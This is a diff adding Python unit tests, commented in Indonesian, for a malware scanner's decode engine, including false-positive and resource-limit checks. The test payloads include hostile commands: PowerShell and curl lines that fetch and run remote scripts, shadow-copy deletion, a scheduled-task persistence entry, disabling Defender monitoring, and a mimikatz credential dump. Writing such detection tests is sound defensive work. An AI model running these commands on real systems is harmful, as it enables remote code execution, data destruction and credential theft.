@@ -12,6 +12,8 @@ Jalankan:
 
 from __future__ import annotations
 
+import base64
+import gzip
 import hashlib
 import json
 import os
@@ -2046,3 +2048,272 @@ class TestSidebarIconsInApp(TempCase):
             ikon.bind("<Button-1>"),
             "ikon tidak mengikat klik, sehingga klik di atasnya tidak berfungsi",
         )
+
+
+class TestDecodeEngine(TempCase):
+    """Mesin dekode: membongkar penyandian lalu menilai isinya.
+
+    Uji di sini memakai muatan yang benar-benar disandikan, bukan tiruan. Yang
+    paling penting diuji bukan hanya "muatan jahat terdeteksi", tetapi juga
+    "berkas bersih tidak dilaporkan" - mesin yang menuduh semua hal akan
+    diabaikan penggunanya, dan itu sama saja dengan tidak ada mesin.
+    """
+
+    def setUp(self) -> None:
+        super().setUp()
+        from scanguard.decode_engine import DecodeEngine
+
+        self.engine = DecodeEngine()
+
+    def _scan(self, data: bytes):
+        return self.engine.scan_bytes(data, "berkas-uji")
+
+    # ------------------------------------------------ penyandian lazim -- #
+
+    def test_finds_gzip_hidden_in_base64(self) -> None:
+        """Susunan paling lazim: perintah jahat dipadatkan lalu di-base64.
+
+        Ini yang tidak bisa ditemukan aturan YARA, karena teks perintahnya tidak
+        pernah muncul di berkas mentah.
+        """
+        perintah = b"vssadmin delete shadows /all /quiet"
+        muatan = base64.b64encode(gzip.compress(perintah))
+        findings = self._scan(b'$p = "' + muatan + b'"\n')
+        self.assertTrue(findings, "muatan gzip-dalam-base64 tidak terdeteksi")
+        self.assertIn("bongkar data terpadatkan", findings[0].detail)
+        self.assertIn("cadangan bayangan", findings[0].detail)
+
+    def test_finds_powershell_encoded_command(self) -> None:
+        """`-EncodedCommand` memakai base64 berisi UTF-16LE.
+
+        Bila muatannya ditebak sebagai UTF-8, byte nol di antara huruf membuat
+        teksnya tidak terbaca dan perintahnya tidak pernah cocok. Versi pertama
+        mesin ini melewatkan kasus ini.
+        """
+        perintah = "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')"
+        enc = base64.b64encode(perintah.encode("utf-16-le")).decode()
+        findings = self._scan(f"$c='powershell -EncodedCommand {enc}'".encode())
+        self.assertTrue(findings, "perintah PowerShell terenkode tidak terdeteksi")
+        self.assertIn("UTF-16LE", findings[0].detail)
+
+    def test_finds_character_codes(self) -> None:
+        perintah = b"os.system('curl http://1.2.3.4/x.sh|sh')"
+        findings = self._scan(",".join(str(b) for b in perintah).encode())
+        self.assertTrue(findings, "daftar kode karakter tidak terdeteksi")
+        self.assertIn("kode karakter", findings[0].detail)
+
+    def test_finds_hex_encoded_text(self) -> None:
+        findings = self._scan(b"schtasks /create /tn Updater /tr evil.exe".hex().encode())
+        self.assertTrue(findings, "teks berheksadesimal tidak terdeteksi")
+
+    def test_finds_multi_layer_encoding(self) -> None:
+        """Tiga lapis: base64(gzip(base64(perintah)))."""
+        perintah = b"vssadmin delete shadows /all /quiet"
+        tiga = base64.b64encode(gzip.compress(base64.b64encode(perintah))).decode()
+        findings = self._scan(f'x="{tiga}"'.encode())
+        self.assertTrue(findings, "penyandian tiga lapis tidak terdeteksi")
+
+    def test_finds_program_embedded_in_encoded_payload(self) -> None:
+        """Program yang disembunyikan di dalam muatan terenkode."""
+        muatan = base64.b64encode(b"MZ" + b"\x00" * 400)
+        findings = self._scan(b'blob = "' + muatan + b'"\n')
+        self.assertTrue(findings, "program tertanam tidak terdeteksi")
+        self.assertIn("program Windows", findings[0].detail)
+
+    # -------------------------------------------------- salah lapor -- #
+
+    def test_clean_base64_is_not_reported(self) -> None:
+        """Base64 biasa bukan bukti apa pun.
+
+        Sertifikat, gambar, dan berkas konfigurasi memakai base64 terus-menerus.
+        Melaporkannya akan membuat program ini penuh temuan palsu.
+        """
+        isi = ("Baris teks biasa tentang cara memakai program ini. " * 20).encode()
+        isi += b"\n" + base64.b64encode(b"ini hanya data biasa untuk pengujian")
+        self.assertEqual(self._scan(isi), [], "berkas bersih dilaporkan")
+
+    def test_random_data_is_not_reported(self) -> None:
+        """Data acak berukuran besar tidak boleh menghasilkan temuan."""
+        self.assertEqual(self._scan(os.urandom(200_000)), [])
+
+    def test_plain_text_is_not_reported(self) -> None:
+        teks = ("Ini berkas teks biasa. " * 200).encode()
+        self.assertEqual(self._scan(teks), [])
+
+    def test_encoding_alone_is_not_enough(self) -> None:
+        """Ada penyandian tetapi isinya tidak berbahaya: jangan dilaporkan."""
+        muatan = base64.b64encode(gzip.compress(b"daftar belanja: telur, susu"))
+        self.assertEqual(self._scan(b'catatan = "' + muatan + b'"'), [])
+
+    # ---------------------------------------------------- tingkatan -- #
+
+    def test_never_reports_malware_severity(self) -> None:
+        """Isi hasil dekode bukan bukti yang bisa diperiksa ulang.
+
+        Batas tertinggi mesin ini MENCURIGAKAN. Tingkat MALWARE hanya boleh
+        datang dari bukti yang bisa diverifikasi ulang: hash yang cocok, aturan
+        YARA, struktur PE, atau tanda tangan ClamAV.
+        """
+        perintah = (
+            b"vssadmin delete shadows /all /quiet; "
+            b"Set-MpPreference -DisableRealtimeMonitoring $true; "
+            b"mimikatz sekurlsa::logonpasswords"
+        )
+        muatan = base64.b64encode(gzip.compress(perintah))
+        findings = self._scan(b'p="' + muatan + b'"')
+        self.assertTrue(findings)
+        for finding in findings:
+            self.assertNotEqual(
+                finding.severity,
+                config.SEV_MALWARE,
+                "mesin dekode memberi tingkat MALWARE; itu di luar wewenangnya",
+            )
+
+    def test_weak_evidence_gives_note_not_suspicious(self) -> None:
+        """Petunjuk lemah saja hanya layak jadi catatan."""
+        muatan = base64.b64encode(b"lihat http://contoh.tld/panduan")
+        findings = self._scan(b'link = "' + muatan + b'"')
+        self.assertTrue(findings)
+        self.assertEqual(findings[0].severity, config.SEV_NOTE)
+
+    # -------------------------------------------------------- batas -- #
+
+    def test_zip_bomb_does_not_hang_or_exhaust_memory(self) -> None:
+        """Satu berkas kecil bisa memuai jadi puluhan MB.
+
+        Tanpa batas hasil, pemindai kehabisan memori dan mati - dan pemindai
+        yang mati lebih buruk daripada pemindai yang melewatkan satu berkas.
+        """
+        bomb = base64.b64encode(gzip.compress(b"A" * 50_000_000))
+        mulai = time.time()
+        findings = self._scan(bomb)
+        self.assertLess(
+            time.time() - mulai, 10.0, "pembongkaran zip bomb berjalan terlalu lama"
+        )
+        self.assertEqual(findings, [])
+
+    def test_deep_nesting_is_bounded(self) -> None:
+        """Penyandian berlapis-lapis harus berhenti di kedalaman batas."""
+        data = b"vssadmin delete shadows /all /quiet"
+        for _ in range(8):
+            data = base64.b64encode(data)
+        mulai = time.time()
+        self.engine.scan_bytes(data, "dalam")
+        self.assertLess(time.time() - mulai, 10.0, "penelusuran lapisan tidak dibatasi")
+
+    def test_large_file_is_read_only_up_to_the_limit(self) -> None:
+        """Batas baca harus benar-benar dipakai, bukan hanya didefinisikan."""
+        besar = b"x" * (config.DECODE_MAX_READ_BYTES + 1024)
+        from scanguard.decode_engine import unpack
+
+        # Tidak melempar dan tidak membaca melebihi batas.
+        self.assertIsInstance(unpack(besar), list)
+
+    def test_broken_compressed_data_does_not_raise(self) -> None:
+        """Data terpadatkan yang rusak tidak boleh melempar kesalahan."""
+        rusak = base64.b64encode(b"\x1f\x8b\x08\x00rusaksekali")
+        self._scan(b'x="' + rusak + b'"')  # tidak boleh melempar
+
+    # --------------------------------------------------- mekanisme -- #
+
+    def test_report_shows_the_evidence(self) -> None:
+        """Laporan harus memuat bukti, bukan hanya tuduhan.
+
+        Pengguna harus bisa menilai sendiri apakah temuan itu masuk akal.
+        """
+        muatan = base64.b64encode(gzip.compress(b"vssadmin delete shadows /all /quiet"))
+        findings = self._scan(b'p="' + muatan + b'"')
+        self.assertIn("Cara dibongkar", findings[0].detail)
+        self.assertIn("Cuplikan hasil dekode", findings[0].detail)
+
+    def test_report_chain_does_not_mislead(self) -> None:
+        """Jejak bukti harus menyebut kandidat aslinya, bukan langkah terakhir.
+
+        Versi pertama menulis "kandidat data terpadatkan" untuk muatan yang
+        sebenarnya ditemukan sebagai base64, karena percobaan pembongkaran gzip
+        menimpa jenis kandidatnya.
+        """
+        muatan = base64.b64encode(gzip.compress(b"vssadmin delete shadows /all /quiet"))
+        findings = self._scan(b'p="' + muatan + b'"')
+        self.assertIn("kandidat base64", findings[0].detail)
+
+    def test_same_payload_is_not_reported_twice(self) -> None:
+        """Muatan yang sama hanya dilaporkan sekali, apa pun jalur pembongkarannya."""
+        muatan = base64.b64encode(gzip.compress(b"vssadmin delete shadows /all /quiet"))
+        findings = self._scan(b'a="' + muatan + b'"\nb="' + muatan + b'"')
+        self.assertEqual(len(findings), 1, "muatan yang sama dilaporkan berkali-kali")
+
+    def test_available_without_extra_packages(self) -> None:
+        """Mesin ini hanya memakai pustaka standar, jadi selalu siap."""
+        self.assertTrue(self.engine.available)
+        self.assertIn("base64", self.engine.status)
+
+    def test_missing_file_returns_empty(self) -> None:
+        self.assertEqual(self.engine.scan_file(os.path.join(self.tmp, "tidak-ada")), [])
+
+
+class TestDecodeInScanner(TempCase):
+    """Mesin dekode di dalam orkestrator pemindaian."""
+
+    def test_scanner_uses_the_decode_engine(self) -> None:
+        from scanguard.scanner import ScanEngine
+
+        engine = ScanEngine(use_clamav=False, use_decode=True)
+        perintah = b"vssadmin delete shadows /all /quiet"
+        path = self.write(
+            "update.ps1", b'$p = "' + base64.b64encode(gzip.compress(perintah)) + b'"\n'
+        )
+        findings = engine.scan_file(path)
+        self.assertTrue(
+            any(f.engine == config.ENGINE_DECODE for f in findings),
+            "orkestrator tidak memakai mesin dekode",
+        )
+
+    def test_decode_engine_can_be_turned_off(self) -> None:
+        """Pengguna harus bisa mematikan mesin ini seperti mesin lain."""
+        from scanguard.scanner import ScanEngine
+
+        engine = ScanEngine(use_clamav=False, use_decode=False)
+        self.assertIsNone(engine.decode)
+        path = self.write(
+            "update.ps1",
+            b'$p = "' + base64.b64encode(gzip.compress(b"vssadmin delete shadows")) + b'"\n',
+        )
+        self.assertFalse(
+            any(f.engine == config.ENGINE_DECODE for f in engine.scan_file(path)),
+            "mesin dekode masih dipakai padahal dimatikan",
+        )
+
+    def test_engine_is_listed_in_prepare_report(self) -> None:
+        from scanguard.scanner import ScanEngine
+
+        engine = ScanEngine(use_clamav=False, use_decode=True)
+        nama = [item["name"] for item in engine.prepare()["engines"]]
+        self.assertIn(config.ENGINE_DECODE, nama, "mesin dekode tidak dilaporkan")
+
+    def test_cache_context_changes_when_engine_toggles(self) -> None:
+        """Hasil lama tidak boleh dipakai untuk susunan mesin yang berbeda."""
+        from scanguard.scanner import ScanEngine
+
+        hidup = ScanEngine(use_clamav=False, use_decode=True)._cache_context()
+        mati = ScanEngine(use_clamav=False, use_decode=False)._cache_context()
+        self.assertNotEqual(
+            hidup,
+            mati,
+            "konteks cache sama padahal susunan mesinnya berbeda",
+        )
+
+    def test_clean_folder_stays_clean(self) -> None:
+        """Folder berisi berkas biasa tidak boleh menghasilkan temuan."""
+        from scanguard.scanner import ScanEngine
+
+        self.write("catatan.txt", b"Catatan biasa tentang proyek ini.\n" * 40)
+        self.write(
+            "konfig.txt",
+            b"data = " + base64.b64encode(b"pengaturan biasa tanpa bahaya") + b"\n",
+        )
+        self.write("data.bin", os.urandom(100_000))
+        engine = ScanEngine(use_clamav=False)
+        summary = engine.scan_directory(os.path.join(self.tmp, "berkas"))
+        palsu = [f for f in summary.findings if f.engine == config.ENGINE_DECODE]
+        self.assertEqual(palsu, [], f"temuan palsu pada berkas bersih: {palsu}")
